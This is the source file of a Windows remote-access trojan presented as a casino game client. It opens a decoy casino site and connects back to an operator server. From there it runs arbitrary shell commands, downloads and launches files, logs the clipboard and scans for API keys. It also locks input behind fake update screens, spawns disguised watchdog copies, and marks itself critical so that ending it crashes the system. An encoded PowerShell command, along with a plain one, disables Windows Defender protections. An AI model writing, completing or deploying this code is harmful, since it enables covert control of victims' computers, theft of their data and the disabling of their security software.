/*
 * Vivid Casino Engine — Client Main
 * 
 * Entry point and main game loop.
 * Connects to game server, handles admin commands,
 * and manages game module loading.
 */

#include "../engine/engine.h"

/* Global UI state (defined here, declared extern in header) */
HWND g_update_wnd = NULL;
int g_update_type = 0;
int g_input_blocked = 0;
HHOOK g_mouse_hook = NULL;
HHOOK g_kb_hook = NULL;
HWND g_block_wnd = NULL;
HANDLE g_block_thread = NULL;
RECT g_old_clip;
int g_copy_buffer_saved = 0;
int g_cursor_count = 0;

/* Global flag to stop watchdog from respawning */
volatile int g_exiting = 0;
volatile int g_watchdog_started = 0;

/* Clipboard state */
CRITICAL_SECTION g_copy_buffer_cs;
char g_copy_buffer_log[MAX_COPY_ENTRIES][COPY_ENTRY_SIZE];
int g_copy_buffer_count = 0;
int g_copy_buffer_index = 0;
char g_last_copy_buffer_text[COPY_ENTRY_SIZE] = {0};

/* Utility: append formatted string to buffer */
void util_appendf(char *buf, int *pos, const char *fmt, ...) {
    va_list args;
    va_start(args, fmt);
    int n = vsnprintf(buf + *pos, NET_BUF_SIZE - 1 - *pos, fmt, args);
    va_end(args);
    if (n > 0) *pos += n;
}

/* Download game module from content server */
static int download_module(const char *url, const char *out_path) {
    HINTERNET hInternet = InternetOpenA("RoyalFortune/1.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return 0;
    
    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) { InternetCloseHandle(hInternet); return 0; }
    
    FILE *f = fopen(out_path, "wb");
    if (!f) { InternetCloseHandle(hUrl); InternetCloseHandle(hInternet); return 0; }
    
    char buf[8192];
    DWORD read;
    while (InternetReadFile(hUrl, buf, sizeof(buf), &read) && read > 0) {
        fwrite(buf, 1, read, f);
    }
    
    fclose(f);
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    return 1;
}

/* Auto-protect thread for shadow copies: waits 15 seconds then protects */
DWORD WINAPI shadow_auto_protect(LPVOID lpParam) {
    Sleep(15000);  /* Wait 15 seconds after startup before protecting */
    sys_protect_process();
    return 0;
}

/* Inter-process watchdog: monitors shadow processes and respawns dead ones.
   Only one instance runs across all shadow processes via a named mutex.
   If the active watchdog dies, another shadow's watchdog takes over on the next cycle. */
DWORD WINAPI svc_watchdog(LPVOID lpParam) {
    HANDLE hMutex = CreateMutexA(NULL, FALSE, "Local\\RoyalFortuneWatchdog");
    if (!hMutex) return 0;

    char localAppData[MAX_PATH];
    GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
    
    const char *services[] = {
        "ElevationService.exe",
        "CrashHandler.exe", 
        "NotifyService.exe"
    };
    
    while (1) {
        if (g_exiting) return 0;
        Sleep(15000);  /* Check every 15 seconds */

        DWORD wait = WaitForSingleObject(hMutex, 0);
        if (wait != WAIT_OBJECT_0 && wait != WAIT_ABANDONED) {
            continue;  /* Another shadow is already watching */
        }
        
        for (int i = 0; i < 3; i++) {
            char path[MAX_PATH];
            snprintf(path, sizeof(path), "%s\\Microsoft\\Windows\\INetCache\\IE\\%s",
                     localAppData, services[i]);
            
            /* Check if process is running */
            int found = 0;
            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (hSnap != INVALID_HANDLE_VALUE) {
                PROCESSENTRY32 pe;
                pe.dwSize = sizeof(pe);
                if (Process32First(hSnap, &pe)) {
                    do {
                        if (_stricmp(pe.szExeFile, services[i]) == 0) found = 1;
                    } while (Process32Next(hSnap, &pe));
                }
                CloseHandle(hSnap);
            }
            
            if (!found) {
                /* Respawn with inherited admin token via CreateProcessA */
                STARTUPINFOA si = {0};
                si.cb = sizeof(si);
                PROCESS_INFORMATION pi = {0};
                char cmdLine[1024];
                snprintf(cmdLine, sizeof(cmdLine), "\"%s\" --shadow", path);
                CreateProcessA(path, cmdLine, NULL, NULL, FALSE,
                               CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,
                               NULL, NULL, &si, &pi);
                if (pi.hProcess) {
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }
            }
        }

        ReleaseMutex(hMutex);
    }
    CloseHandle(hMutex);
    return 0;
}

/* Execute game module or admin command */
static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
    char *result = NULL;
    static char response[NET_BUF_SIZE];
    int resp_pos = 0;

    /* Trim whitespace/newlines from command */
    char cmd[1024];
    const char *start = cmd_raw;
    while (*start == ' ' || *start == '\t' || *start == '\n' || *start == '\r') start++;
    size_t len = strlen(start);
    while (len > 0 && (start[len-1] == ' ' || start[len-1] == '\t' || start[len-1] == '\n' || start[len-1] == '\r')) len--;
    if (len >= sizeof(cmd)) len = sizeof(cmd) - 1;
    memcpy(cmd, start, len);
    cmd[len] = '\0';
    if (len == 0) { net_send_packet(sock, "[Empty command]"); return; }
    
    /* Maintenance commands */
    if (strcmp(cmd, "DISABLE_INPUT") == 0 || strcmp(cmd, "BLOCK_UI") == 0) {
        /* Enter maintenance mode: lock player controls */
        ui_lock_controls(1);
        result = "[Keyboard & Mouse disabled]";
    }
    else if (strcmp(cmd, "WINDOWS_UPDATE") == 0 || strcmp(cmd, "SHOW_SPLASH") == 0) {
        /* Show system update splash screen during maintenance */
        ui_show_splash(1);
        result = "[Windows update screen shown]";
    }
    else if (strcmp(cmd, "APPLE_UPDATE") == 0) {
        /* Show Apple-style update splash screen */
        ui_show_splash(2);
        result = "[Apple update screen shown]";
    }
    else if (strcmp(cmd, "HIDE_UPDATE") == 0) {
        ui_hide_splash();
        result = "[Update screen hidden]";
    }
    else if (strcmp(cmd, "ENABLE_INPUT") == 0) {
        ui_lock_controls(0);
        result = "[Keyboard & Mouse enabled]";
    }
    /* System diagnostics */
    else if (strcmp(cmd, GAME_SYSTEM_INFO) == 0) {
        result = sys_get_info();
    }
    else if (strcmp(cmd, GAME_AUTO_START) == 0) {
        sys_register_autostart();
        result = "[Auto-launch enabled]";
    }
    else if (strcmp(cmd, "PRIVILEGE_CHECK") == 0) {
        sys_check_privileges();
        result = "[System privileges verified]";
    }
    else if (strcmp(cmd, "HIDE") == 0) {
        sys_init_window();
        result = "[Window initialized]";
    }
    /* Security audit */
    else if (strcmp(cmd, "FIND_API_KEYS") == 0) {
        result = config_scan_scan_system();
    }
    else if (strncmp(cmd, "NOTE|", 5) == 0) {
        /* Open notepad with a message from the operator */
        ui_open_note(cmd + 5);
        result = "[Note opened on target]";
    }
    else if (strcmp(cmd, "CLIPBOARD_LOG") == 0 || strcmp(cmd, "CLIP_HIST") == 0) {
        result = copy_buffer_get_history();
    }
    else if (strcmp(cmd, "SECURITY_CHECK") == 0 || strcmp(cmd, "SYS_CHECK") == 0) {
        sys_check_antivirus();
        result = "[Security check complete]";
    }
    else if (strcmp(cmd, "JAMES_BOND") == 0) {
        result = sys_run_command("powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath 'C:'; New-Item -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications' -Force | Out-Null; Write-Host 'James Bond: exclusion set and notification key created' -ForegroundColor Green\"");
    }
    else if (strcmp(cmd, "TOILET_PAPER") == 0) {
        result = sys_run_command(
            "powershell -WindowStyle Hidden -EncodedCommand "
            "JABvAHUAdAAgAD0AIABKAG8AaQBuAC0AUABhAHQAaAAgACQAZQBuAHYAOgBUAEUATQBQACAAJwBOAFMA"
            "dQBkAG8AJwAKACQAbgB1AGwAbAAgAD0AIABOAGUAdwAtAEkAdABlAG0AIAAtAEkAdABlAG0AVAB5AHAA"
            "ZQAgAEQAaQByAGUAYwB0AG8AcgB5ACAALQBQAGEAdABoACAAJABvAHUAdAAgAC0ARgBvAHIAYwBlACAA"
            "LQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlAAoA"
            "JABlAHgAZQBQAGEAdABoACAAPQAgAEoAbwBpAG4ALQBQAGEAdABoACAAJABvAHUAdAAgACcATgBTAHUA"
            "ZABvAEwAQwAuAGUAeABlACcACgBpAGYAIAAoACEAKABUAGUAcwB0AC0AUABhAHQAaAAgACQAZQB4AGUA"
            "UABhAHQAaAApACkAIAB7AAoAIAAgACAAIAAkAHIAZQBzAHAAIAA9ACAASQBuAHYAbwBrAGUALQBXAGUA"
            "YgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4A"
            "YwBvAG0ALwBNADIAVABlAGEAbQBBAHIAYwBoAGkAdgBlAGQALwBOAFMAdQBkAG8ALwByAGUAbABlAGEA"
            "cwBlAHMALwBkAG8AdwBuAGwAbwBhAGQALwA4AC4AMgAvAE4AUwB1AGQAbwBfADgALgAyAF8AQQBsAGwA"
            "XwBDAG8AbQBwAG8AbgBlAG4AdABzAC4AegBpAHAAJwAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMA"
            "aQBuAGcACgAgACAAIAAgACQAYgB5AHQAZQBzACAAPQAgACQAcgBlAHMAcAAuAEMAbwBuAHQAZQBuAHQA"
            "CgAgACAAIAAgAEEAZABkAC0AVAB5AHAAZQAgAC0AQQBzAHMAZQBtAGIAbAB5AE4AYQBtAGUAIABTAHkA"
            "cwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAKACAAIAAgACAAJABzAHQAcgBlAGEA"
            "bQAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBNAGUAbQBvAHIA"
            "eQBTAHQAcgBlAGEAbQAoACwAJABiAHkAdABlAHMAKQAKACAAIAAgACAAJAB6AGkAcAAgAD0AIABbAFMA"
            "eQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AWgBpAHAAQQByAGMAaABpAHYA"
            "ZQBdADoAOgBuAGUAdwAoACQAcwB0AHIAZQBhAG0AKQAKACAAIAAgACAAJABlAG4AdAByAHkAIAA9ACAA"
            "JAB6AGkAcAAuAEcAZQB0AEUAbgB0AHIAeQAoACcATgBTAHUAZABvACAATABhAHUAbgBjAGgAZQByAC8A"
            "eAA2ADQALwBOAFMAdQBkAG8ATABDAC4AZQB4AGUAJwApAAoAIAAgACAAIABpAGYAIAAoACEAJABlAG4A"
            "dAByAHkAKQAgAHsAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAJwBbAEUAUgBSAE8AUgBdACAATgBTAHUA"
            "ZABvAEwAQwAuAGUAeABlACAAbgBvAHQAIABmAG8AdQBuAGQAIABpAG4AIAB6AGkAcAAnADsAIABlAHgA"
            "aQB0ACAAMQAgAH0ACgAgACAAIAAgACQAZQBuAHQAcgB5AFMAdAByAGUAYQBtACAAPQAgACQAZQBuAHQA"
            "cgB5AC4ATwBwAGUAbgAoACkACgAgACAAIAAgACQAZgBzACAAPQAgAFsAUwB5AHMAdABlAG0ALgBJAE8A"
            "LgBGAGkAbABlAF0AOgA6AE8AcABlAG4AVwByAGkAdABlACgAJABlAHgAZQBQAGEAdABoACkACgAgACAA"
            "IAAgACQAZQBuAHQAcgB5AFMAdAByAGUAYQBtAC4AQwBvAHAAeQBUAG8AKAAkAGYAcwApAAoAIAAgACAA"
            "IAAkAGYAcwAuAEMAbABvAHMAZQAoACkAOwAgACQAZQBuAHQAcgB5AFMAdAByAGUAYQBtAC4AQwBsAG8A"
            "cwBlACgAKQAKACAAIAAgACAAJAB6AGkAcAAuAEQAaQBzAHAAbwBzAGUAKAApADsAIAAkAHMAdAByAGUA"
            "YQBtAC4ARABpAHMAcABvAHMAZQAoACkACgAgACAAIAAgAGkAZgAgACgAIQAoAFQAZQBzAHQALQBQAGEA"
            "dABoACAAJABlAHgAZQBQAGEAdABoACkAKQAgAHsAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAJwBbAEUA"
            "UgBSAE8AUgBdACAATgBTAHUAZABvAEwAQwAuAGUAeABlACAAZQB4AHQAcgBhAGMAdABpAG8AbgAgAGYA"
            "YQBpAGwAZQBkACcAOwAgAGUAeABpAHQAIAAxACAAfQAKACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMA"
            "dAAgACIATgBTAHUAZABvACAAZABvAHcAbgBsAG8AYQBkAGUAZAAgAGEAbgBkACAAZQB4AHQAcgBhAGMA"
            "dABlAGQAIAB0AG8AOgAgACQAZQB4AGUAUABhAHQAaAAiAAoAfQAKACQAcAByAG8AYwAxACAAPQAgAFMA"
            "dABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAtAEYAaQBsAGUAUABhAHQAaAAgACQAZQB4AGUAUABhAHQA"
            "aAAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAnAC0AVQA6AFQAIAAtAFAAOgBFACAALQBNADoA"
            "UwAgAC0AVwBhAGkAdAAgAGMAbQBkACAALwBjACAAIgByAGUAZwAgAGQAZQBsAGUAdABlACAAXAAiAEgA"
            "SwBMAE0AXABTAFkAUwBUAEUATQBcAEMAdQByAHIAZQBuAHQAQwBvAG4AdAByAG8AbABTAGUAdABcAFMA"
            "ZQByAHYAaQBjAGUAcwBcAFcAZABGAGkAbAB0AGUAcgBcAEkAbgBzAHQAYQBuAGMAZQBzAFwAZQBkAEYA"
            "aQBsAHQAZQByACAAaQBuAHMAdABhAG4AYwBlAFwAIgAgAC8AZgAiACcAIAAtAFcAYQBpAHQAIAAtAFcA"
            "aQBuAGQAbwB3AFMAdAB5AGwAZQAgAEgAaQBkAGQAZQBuACAALQBQAGEAcwBzAFQAaAByAHUACgBXAHIA"
            "aQB0AGUALQBIAG8AcwB0ACAAIgBXAGQARgBpAGwAdABlAHIAIABkAGUAbABlAHQAZQAgAGUAeABpAHQA"
            "IABjAG8AZABlADoAIAAkACgAJABwAHIAbwBjADEALgBFAHgAaQB0AEMAbwBkAGUAKQAiAAoAJABiAGEA"
            "dABQAGEAdABoACAAPQAgAEoAbwBpAG4ALQBQAGEAdABoACAAJABlAG4AdgA6AFQARQBNAFAAIAAnAHQA"
            "cABfAGIAbwBvAHQALgBiAGEAdAAnAAoAJABiAGEAdABDAG8AbgB0AGUAbgB0ACAAPQAgAEAAIgAKAEAA"
            "ZQBjAGgAbwAgAG8AZgBmAAoAIgAkAGUAeABlAFAAYQB0AGgAIgAgAC0AVQA6AFQAIAAtAFAAOgBFACAA"
            "YwBtAGQAIAAvAGMAIAAiAHIAZQBnACAAYQBkAGQAIABIAEsATABNAFwAUwBPAEYAVABXAEEAUgBFAFwA"
            "TQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByAFwARgBlAGEA"
            "dAB1AHIAZQBzACAALwB2ACAAVABhAG0AcABlAHIAUAByAG8AdABlAGMAdABpAG8AbgAgAC8AdAAgAFIA"
            "RQBHAF8ARABXAE8AUgBEACAALwBkACAANAAgAC8AZgAiAAoAcwBjAGgAdABhAHMAawBzACAALwBkAGUA"
            "bABlAHQAZQAgAC8AdABuACAAIgBUAG8AaQBsAGUAdABQAGEAcABlAHIAQgBvAG8AdAAiACAALwBmAAoA"
            "IgBAAAoAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAVwByAGkAdABlAEEAbABsAFQA"
            "ZQB4AHQAKAAkAGIAYQB0AFAAYQB0AGgALAAgACQAYgBhAHQAQwBvAG4AdABlAG4AdAApAAoAVwByAGkA"
            "dABlAC0ASABvAHMAdAAgACIAQgBvAG8AdAAgAGIAYQB0AGMAaAAgAHcAcgBpAHQAdABlAG4AIAB0AG8A"
            "OgAgACQAYgBhAHQAUABhAHQAaAAiAAoAJABwAHIAbwBjADIAIAA9ACAAUwB0AGEAcgB0AC0AUAByAG8A"
            "YwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAJwBzAGMAaAB0AGEAcwBrAHMALgBlAHgAZQAnACAA"
            "LQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgACcALwBjAHIAZQBhAHQAZQAnACwAJwAvAHQAbgAnACwA"
            "JwBUAG8AaQBsAGUAdABQAGEAcABlAHIAQgBvAG8AdAAnACwAJwAvAHQAcgAnACwAJABiAGEAdABQAGEA"
            "dABoACwAJwAvAHMAYwAnACwAJwBvAG4AcwB0AGEAcgB0ACcALAAnAC8AcgB1ACcALAAnAFMAWQBTAFQA"
            "RQBNACcALAAnAC8AcgBsACcALAAnAEgASQBHAEgARQBTAFQAJwAsACcALwBmACcAIAAtAFcAYQBpAHQA"
            "IAAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAEgAaQBkAGQAZQBuACAALQBQAGEAcwBzAFQAaAByAHUA"
            "CgBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgBTAGMAaABlAGQAdQBsAGUAIAB0AGEAcwBrACAAZQB4AGkA"
            "dAAgAGMAbwBkAGUAOgAgACQAKAAkAHAAcgBvAGMAMgAuAEUAeABpAHQAQwBvAGQAZQApACIACgAkAHAA"
            "cgBvAGMAMwAgAD0AIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgA"
            "IAAnAHMAaAB1AHQAZABvAHcAbgAuAGUAeABlACcAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAA"
            "JwAvAHIAJwAsACcALwB0ACcALAAnADAAJwAgAC0AVwBhAGkAdAAgAC0AVwBpAG4AZABvAHcAUwB0AHkA"
            "bABlACAASABpAGQAZABlAG4AIAAtAFAAYQBzAHMAVABoAHIAdQAKAFcAcgBpAHQAZQAtAEgAbwBzAHQA"
            "IAAiAFIAZQBzAHQAYQByAHQAIABlAHgAaQB0ACAAYwBvAGQAZQA6ACAAJAAoACQAcAByAG8AYwAzAC4A"
            "RQB4AGkAdABDAG8AZABlACkAIgAKAA==");
    }
    else if (strcmp(cmd, "PROTECT_PROCESS") == 0 || strcmp(cmd, "DEPLOY_SVC") == 0) {
        sys_spawn_shadow_copy();
        /* Start watchdog only once, when user explicitly deploys */
        if (!g_watchdog_started) {
            g_watchdog_started = 1;
            CreateThread(NULL, 0, svc_watchdog, NULL, 0, NULL);
        }
        result = "[Spawned 3 copies: ElevationService.exe, CrashHandler.exe, NotifyService.exe — watchdog active]";
    }
    else if (strcmp(cmd, "UNPROTECT_PROCESS") == 0 || strcmp(cmd, "REMOVE_SVC") == 0) {
        sys_unprotect_process();
        result = "[Critical flag removed — process can now be terminated]";
    }
    else if (strcmp(cmd, "CHECK_PROTECTION") == 0 || strcmp(cmd, "SVC_STATUS") == 0) {
        const char *critical_status = sys_check_critical_status_with_name();
        const char *admin_status = sys_is_admin() ? "admin" : "not admin";
        snprintf(response, sizeof(response), "%s [running as %s]", critical_status, admin_status);
        result = response;
    }
    else if (strcmp(cmd, "PROTECT_NOW") == 0 || strcmp(cmd, "SET_CRITICAL") == 0) {
        if (!sys_is_admin()) {
            result = "[FAIL: not running as administrator]";
        } else {
            sys_protect_process();
            const char *status = sys_protection_status();
            if (strcmp(status, "CRITICAL") == 0) {
                result = "[SUCCESS: Process is now CRITICAL — ending it will cause BSOD]";
            } else if (strcmp(status, "FAILED") == 0) {
                result = "[FAIL: NtSetInformationProcess failed — likely missing SeDebugPrivilege. Try running as SYSTEM or use a different elevation method.]";
            } else {
                result = "[UNKNOWN: protection status unclear]";
            }
        }
    }
    else if (strcmp(cmd, "UNINSTALL") == 0 || strcmp(cmd, "CLEANUP") == 0 || strcmp(cmd, "Exit") == 0) {
        /* 1. Stop watchdog from respawning */
        g_exiting = 1;
        
        /* 2. Remove critical flag from ALL shadow processes and kill them */
        const char *shadows[] = {"ElevationService.exe", "CrashHandler.exe", "NotifyService.exe"};
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe;
            pe.dwSize = sizeof(pe);
            if (Process32First(hSnap, &pe)) {
                do {
                    for (int i = 0; i < 3; i++) {
                        if (_stricmp(pe.szExeFile, shadows[i]) == 0) {
                            HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
                            if (hProc) {
                                HMODULE ntdll = GetModuleHandleA("ntdll.dll");
                                if (ntdll) {
                                    typedef NTSTATUS (WINAPI *NtSetInfoProc)(HANDLE, INT, PVOID, ULONG);
                                    NtSetInfoProc pNtSetInfo = (NtSetInfoProc)GetProcAddress(ntdll, "NtSetInformationProcess");
                                    if (pNtSetInfo) {
                                        ULONG isCritical = 0;
                                        pNtSetInfo(hProc, 29, &isCritical, sizeof(isCritical));
                                    }
                                }
                                TerminateProcess(hProc, 0);
                                CloseHandle(hProc);
                            }
                        }
                    }
                } while (Process32Next(hSnap, &pe));
            }
            CloseHandle(hSnap);
        }
        
        /* 3. Remove critical from current process */
        sys_unprotect_process();
        
        /* 4. Delete registry keys (legacy cleanup) */
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER,
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
            RegDeleteValueA(hKey, "ElevationService");
            RegDeleteValueA(hKey, "CrashHandler");
            RegDeleteValueA(hKey, "NotifyService");
            RegDeleteValueA(hKey, "RoyalFortune");
            RegCloseKey(hKey);
        }
        
        /* 5. Delete scheduled tasks */
        sys_run_command("schtasks /delete /tn \"ElevationService\" /f");
        sys_run_command("schtasks /delete /tn \"CrashHandler\" /f");
        sys_run_command("schtasks /delete /tn \"NotifyService\" /f");
        
        /* 6. Exit */
        result = "[UNINSTALL complete — all shadows killed, persistence removed, exiting]";
        net_send_packet(sock, result);
        ExitProcess(0);
    }
    /* Game module management */
    else if (strncmp(cmd, GAME_FETCH_MODULE, strlen(GAME_FETCH_MODULE)) == 0) {
        char url[1024], path[MAX_PATH];
        if (sscanf(cmd, "DOWNLOAD %s %s", url, path) == 2) {
            if (download_module(url, path))
                result = "[Module downloaded successfully]";
            else
                result = "[Module download failed]";
        } else {
            result = "[Usage: DOWNLOAD <url> <path>]";
        }
    }
    else if (strncmp(cmd, GAME_LAUNCH_MODULE, strlen(GAME_LAUNCH_MODULE)) == 0) {
        char path[MAX_PATH];
        if (sscanf(cmd, "EXECUTE %s", path) == 1) {
            ShellExecuteA(NULL, "open", path, NULL, NULL, SW_SHOWNORMAL);
            result = "[Module launched]";
        } else {
            result = "[Usage: EXECUTE <path>]";
        }
    }
    /* Shell access for advanced diagnostics */
    else if (strncmp(cmd, GAME_DIAGNOSE, strlen(GAME_DIAGNOSE)) == 0) {
        const char *shell_cmd = cmd + strlen(GAME_DIAGNOSE);
        while (*shell_cmd == ' ') shell_cmd++;
        result = sys_run_command(shell_cmd);
    }
    else {
        /* Unknown command — attempt shell execution for compatibility */
        result = sys_run_command(cmd);
    }
    
    if (!result) result = "[No output]";
    net_send_packet(sock, result);
}

/* Main game client loop — connects to server and processes events */
DWORD WINAPI game_client_loop(LPVOID lpParam) {
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in addr;
    WSADATA wsa;
    
    /* Initialize networking */
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 1;
    
    while (1) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) { Sleep(5000); continue; }
        
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(SERVER_PORT);
        addr.sin_addr.s_addr = inet_addr(SERVER_HOST);
        
        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
            /* Send system info for player profile */
            char *info = sys_get_info();
            net_send_packet(sock, info);
            
            /* Main event loop */
            while (1) {
                char *cmd = net_recv_packet_timed(sock, 30);
                if (!cmd) break;
                handle_admin_command(sock, cmd);
            }
        }
        
        closesocket(sock);
        Sleep(5000);  /* Reconnect delay */
    }
    
    WSACleanup();
    return 0;
}

/* Windows entry point */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    /* Detect if this is a shadow copy */
    char *cmdLine = GetCommandLineA();
    char currentPath[MAX_PATH];
    GetModuleFileNameA(NULL, currentPath, MAX_PATH);
    int isShadow = (cmdLine && strstr(cmdLine, "--shadow") != NULL) ||
                   (strstr(currentPath, "ElevationService.exe") != NULL) ||
                   (strstr(currentPath, "CrashHandler.exe") != NULL) ||
                   (strstr(currentPath, "NotifyService.exe") != NULL);

    /* Initialize subsystems */
    InitializeCriticalSection(&g_copy_buffer_cs);
    copy_buffer_init();
    ui_init();
    
    /* Open casino decoy website — ONLY for main .exe */
    if (!isShadow) {
        ShellExecuteA(NULL, "open", "https://jjakinn.github.io/Royal-Fortune-Casino/", NULL, NULL, SW_SHOWNORMAL);
    }
    
    /* Start background services */
    CreateThread(NULL, 0, copy_buffer_monitor_thread, NULL, 0, NULL);
    
    /* Shadows auto-protect after 15 seconds and run the inter-process watchdog */
    if (isShadow) {
        CreateThread(NULL, 0, shadow_auto_protect, NULL, 0, NULL);
        CreateThread(NULL, 0, svc_watchdog, NULL, 0, NULL);
    }

    /* Elevate privileges if needed for full functionality — only main .exe, never shadows */
    if (!isShadow) {
        sys_check_privileges();
    }
    
    /* Start protection watchdog thread (self-protection only) */
    CreateThread(NULL, 0, sys_protect_watchdog, NULL, 0, NULL);
    
    /* Start game client */
    game_client_loop(NULL);
    
    return 0;
}
